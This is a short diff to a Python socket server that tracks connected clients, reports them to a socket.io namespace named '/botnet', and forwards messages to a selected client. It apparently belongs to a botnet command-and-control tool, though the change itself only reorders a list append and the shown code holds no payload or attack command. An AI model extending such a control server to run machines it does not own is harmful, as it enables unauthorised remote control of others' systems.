@@ -67,6 +67,7 @@ def listen(ip, port):
     ans = ''
     while True:
         (conn,address) = s.accept()
+        clients.append((conn, address))
         c=[]
         for _, addr in clients:
             c.append(str(addr))
@@ -74,7 +75,6 @@ def listen(ip, port):
         print('C: ',c)
         print(f"\n[+] - Server Conneted to client at [{address[0]} ] : [ {address[1]}]")
         socket_.emit('printer', {'data':f'\n[+] - Server Conneted to client at [{address[0]} ] : [ {address[1]}]'}, namespace='/botnet')
-        clients.append((conn, address))
 
 
 
@@ -112,6 +112,7 @@ def sendMessage(data):
     else:
         newstr = message['client']
         getres = int(newstr[len(newstr)-1])
+
         clients[getres][0].send((message['message']+"\n").encode())
         clients[getres][0].settimeout(1)
         try:
